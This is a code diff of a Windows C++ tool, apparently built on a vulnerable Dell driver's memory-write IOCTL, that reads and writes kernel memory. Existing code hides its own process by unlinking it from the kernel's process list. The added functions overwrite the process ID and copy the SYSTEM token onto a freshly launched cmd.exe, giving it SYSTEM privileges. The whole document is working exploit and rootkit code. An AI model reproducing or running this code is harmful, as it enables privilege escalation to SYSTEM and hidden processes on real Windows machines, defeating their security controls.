@@ -1,4 +1,4 @@
-﻿// HideMyAss.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
+// HideMyAss.cpp : 此檔案包含 'main' 函式。程式會於該處開始執行及結束執行。
 //
 
 #include <iostream>
@@ -134,9 +134,75 @@ void HideMyProcess(CLIENT_ID OurProc) {
 	WriteDWORD64(ourEproc + Offsets.ActiveProcessLinks, 0);
 	WriteDWORD64(ourEproc + Offsets.ThreadListEntry + 0x8, 0);
 	std::cout << "[#]Cant see me (-john cena)" << std::endl;
-
 }
 
+void ChangeMyPid(CLIENT_ID OurProc, int NewPid) {
+	DWORD64 ourEproc = LookupEprocessByPid(systemEprocessAddr, OurProc);
+	std::cout << "[#]Found our EPROCESS @: " << ourEproc << std::endl;
+	WriteDWORD64(ourEproc + Offsets.UniqueProcessId, NewPid);
+	std::cout << "[#]Changed PID to: " << NewPid << std::endl;
+}
+
+DWORD64 RetriveTokenAdress(CLIENT_ID procid) {
+	return  LookupEprocessByPid(systemEprocessAddr, procid) + Offsets.Token;
+}
+
+
+VOID WriteBySize(SIZE_T Size, DWORD64 Address, DWORD* Buffer) {
+	struct DBUTIL23_MEMORY_WRITE* WriteBuff = (DBUTIL23_MEMORY_WRITE*)calloc(1, Size + sizeof(struct DBUTIL23_MEMORY_WRITE));
+	if (!WriteBuff) {
+		exit(1);
+	}
+	WriteBuff->Address = Address;
+	WriteBuff->Offset = 0;
+	DWORD BytesReturned;
+
+	if (Address < 0x0000800000000000) {
+		exit(1);
+	}
+	if (Address < 0xFFFF800000000000) {
+		exit(1);
+	}
+
+	memcpy(WriteBuff->Buffer, Buffer, Size);
+	DeviceIoControl(Device,
+		DBUTIL_WRITE_IOCTL,
+		WriteBuff,
+		offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
+		WriteBuff,
+		offsetof(struct DBUTIL23_MEMORY_WRITE, Buffer) + (DWORD)Size,
+		&BytesReturned,
+		NULL);
+}
+
+
+void TransferToken(CLIENT_ID Src, CLIENT_ID Dst) {
+
+	DWORD64 DestinationTokenAddress = RetriveTokenAdress(Dst);
+	DWORD64 SourceTokenAddress = RetriveTokenAdress(Src);
+	BYTE DestinationToken[8];
+	for (int i = 0; i < 8; i++)
+		DestinationToken[i] = ReadBYTE(DestinationTokenAddress + i);
+	EX_FAST_REF* DstTokenObj = (EX_FAST_REF*)(void*)DestinationToken;
+	std::cout << "[#]Got:" << std::hex << DstTokenObj->Object << " for Process:" << (int)(DWORD)Dst.UniqueProcess << std::endl;
+
+	BYTE SourceToken[8];
+	for (int i = 0; i < 8; i++)
+		SourceToken[i] = ReadBYTE(SourceTokenAddress + i);
+	EX_FAST_REF* systemtoken = (EX_FAST_REF*)(void*)SourceToken;
+	std::cout << "[#]Got:" << std::hex << systemtoken->Object << " for Process:" << (int)(DWORD)Src.UniqueProcess << std::endl;
+	std::cout << "[#]Elevating token from from:" << std::hex << DstTokenObj->Value << " To:" << std::hex << systemtoken->Value << std::endl;
+	DstTokenObj->Value = systemtoken->Value;
+	BYTE newtoken[8];
+	std::memcpy(newtoken, DstTokenObj, 8);
+	for (int i = 0; i < 8; i++)
+	{
+		DWORD NewTokenData = newtoken[i];
+		WriteBySize(sizeof(BYTE), DestinationTokenAddress + i, &NewTokenData);
+	}
+	std::cout << "[#]Finished -> who are you now?" << std::endl;
+
+}
 int main()
 {
 	DWORD64 EtwProvRegHandle;
@@ -153,5 +219,15 @@ int main()
 	kernelBase = GetKernelBaseAddress();
 	systemEprocessAddr = PsInitialSystemProcess();
 
-	HideMyProcess( CLIENT_ID { (HANDLE)GetCurrentProcessId(), nullptr});
+	//HideMyProcess( CLIENT_ID { (HANDLE)GetCurrentProcessId(), nullptr});
+
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFO si = { 0 };
+	std::cout << "[#]Creating new CMD" << std::endl;
+	BOOL created = CreateProcess(L"C:\\windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+	ChangeMyPid(CLIENT_ID{ (HANDLE)GetCurrentProcessId(), nullptr }, 0);
+
+	TransferToken(CLIENT_ID{ (HANDLE)4, nullptr }, CLIENT_ID{ (HANDLE)pi.dwProcessId, nullptr });
+	Sleep(-1);
 }
